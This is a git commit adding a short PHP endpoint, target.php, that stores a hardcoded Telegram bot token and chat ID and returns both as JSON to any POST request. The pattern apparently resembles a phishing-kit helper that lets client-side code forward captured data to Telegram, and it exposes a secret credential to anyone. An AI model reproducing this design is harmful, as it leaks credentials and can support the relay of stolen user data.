ede54b09b530e38c654af03f210ea68640065f14
luisteed <luisted1512@gmail.com>
2025-01-25 14:36:16 -0500

    sexto commit

---
+++ target.php
@@ -0,0 +1,25 @@
+<?php
+session_start();
+
+// Guarda los valores en la sesión
+$_SESSION['chat_id'] = "-4661960771";
+$_SESSION['token'] = "7638566392:AAGcHKw7K6RAMiA2z9ai1HfNpdowf_dZxnU";
+
+// Verifica si el método de solicitud es POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Verifica si los valores de sesión están configurados
+    if (isset($_SESSION['chat_id']) && isset($_SESSION['token'])) {
+        // Enviamos los datos como JSON
+        echo json_encode([
+            "chat_id" => $_SESSION['chat_id'],
+            "token" => $_SESSION['token']
+        ]);
+    } else {
+        // Si no están configurados, enviamos un error
+        echo json_encode(["error" => "Datos de sesión no encontrados"]);
+    }
+} else {
+    // Si el método no es POST, envía un mensaje de error
+    echo json_encode(["error" => "Método no permitido"]);
+}
+?>
